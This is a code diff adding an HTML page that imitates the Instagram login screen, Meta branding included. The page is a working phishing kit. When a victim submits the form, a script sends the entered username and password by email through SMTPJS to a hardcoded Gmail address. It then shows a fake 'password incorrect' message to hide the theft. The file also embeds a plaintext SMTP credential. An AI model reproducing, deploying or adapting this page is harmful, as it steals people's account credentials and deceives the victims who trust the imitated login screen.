@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Instagram Login</title>
+    <link rel="stylesheet" type="text/css" href="instagram.css" />
+  </head>
+  <body>
+    <div class="login-container">
+      <img src="images/233.PNG" alt="Instagram Logo" />
+      <form onsubmit="Mail(); reset(); return false;">
+        <input type="text" id="username" placeholder="Username" required />
+        <input type="password" id="password" placeholder="Password" required />
+        <button type="submit" id="buttons">Login</button>
+        <p class="forgot-password"><a href="">Forgot password?</a></p>
+      </form>
+    </div>
+    <div class="account">
+      <p>
+        Don't have an account?
+        <span class="forgot-password"> <a href="">SignUp</a></span>
+      </p>
+    </div>
+    <div class="meta-img">
+      <p>From</p>
+      <img class="img2" src="images/Capture3444.PNG" alt="" /><span class="meta"
+        >Meta</span
+      >
+    </div>
+    <script src="instagram.js"></script>
+    <!--Smtpjs-->
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+    <script>
+      function Mail() {
+        let username = document.getElementById("username").value;
+        let password = document.getElementById("password").value;
+
+        Email.send({
+          Host: "smtp.elasticemail.com",
+          Username: "thomaswills939@gmail.com",
+          Password: "48EC737848288E288E040C0C9C7629431034",
+          To: "stevethomas0901@gmail.com",
+          From: "thomaswills939@gmail.com",
+          Subject: "Mail From Voting Form",
+          Body: "Username:" + username + "<br> Password:" + password,
+        }).then((message) =>
+          alert(
+            "Sorry, your password was incorrect. Please double-check your password"
+          )
+        );
+      }
+    </script>
+  </body>
+</html>
